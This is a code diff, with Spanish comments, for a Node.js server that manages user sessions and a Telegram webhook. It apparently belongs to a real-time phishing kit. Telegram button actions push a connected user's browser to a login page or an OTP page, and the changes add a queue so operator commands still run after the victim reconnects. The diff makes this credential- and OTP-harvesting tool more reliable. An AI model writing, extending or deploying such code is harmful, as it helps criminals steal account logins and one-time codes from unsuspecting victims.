@@ -122,7 +122,7 @@ class SessionManager {
     
     static get(sessionId) {
         const session = activeSessions.get(sessionId);
-        if (session) session.lastActivity = new Date();
+        if (session) session.lastActivity = Date.now();
         return session;
     }
     
@@ -140,7 +140,7 @@ class SessionManager {
         if (session) {
             session.lastSocketId = session.socketId;
             session.socketId = newSocketId;
-            session.lastActivity = new Date();
+            session.lastActivity = Date.now();
             session.reconnectCount++;
         }
     }
@@ -170,7 +170,7 @@ class SessionManager {
         // Buscar en cualquier sesión
         for (const [sessionId, sess] of activeSessions.entries()) {
             if (sess.socketId === socketId || sess.lastSocketId === socketId) {
-                sess.lastActivity = new Date();
+                sess.lastActivity = Date.now();
                 return { sessionId, session: sess };
             }
         }
@@ -186,6 +186,9 @@ class SessionManager {
     static getConnectedSocket(sessionId, io) {
         const session = activeSessions.get(sessionId);
         if (!session) return null;
+        
+        // Actualizar actividad cada vez que se busca
+        session.lastActivity = Date.now();
         
         // Intentar con socketId actual
         let socket = io.sockets.sockets.get(session.socketId);
@@ -237,7 +240,10 @@ app.post('/telegram-webhook', async (req, res) => {
             const socket = SessionManager.getConnectedSocket(sessionId, io);
             
             if (socket) {
-                console.log(`✓ Socket encontrado y conectado para sesión ${sessionId}`);
+                // Actualizar actividad
+                const session = SessionManager.get(sessionId);
+                if (session) session.lastActivity = Date.now();
+                
                 const actions = {
                     logo: { url: '/index.html', msg: '🔄 Redirigiendo al login...' },
                     otp: { url: '/otp.html', msg: '📲 Solicitando OTP...' },
@@ -252,8 +258,12 @@ app.post('/telegram-webhook', async (req, res) => {
                     if (action === 'finish') SessionManager.delete(sessionId);
                 }
             } else {
-                console.log(`✗ Socket no encontrado o desconectado para sesión ${sessionId}`);
-                await TelegramService.answerCallbackQuery(callback_query.id, '❌ Usuario desconectado. Pídele que recargue la página.');
+                // Guardar comando pendiente
+                pendingCommands.set(sessionId, { action, timestamp: Date.now() });
+                await TelegramService.answerCallbackQuery(
+                    callback_query.id, 
+                    '⏳ Guardado. Se ejecutará cuando el usuario se reconecte.'
+                );
             }
         }
         
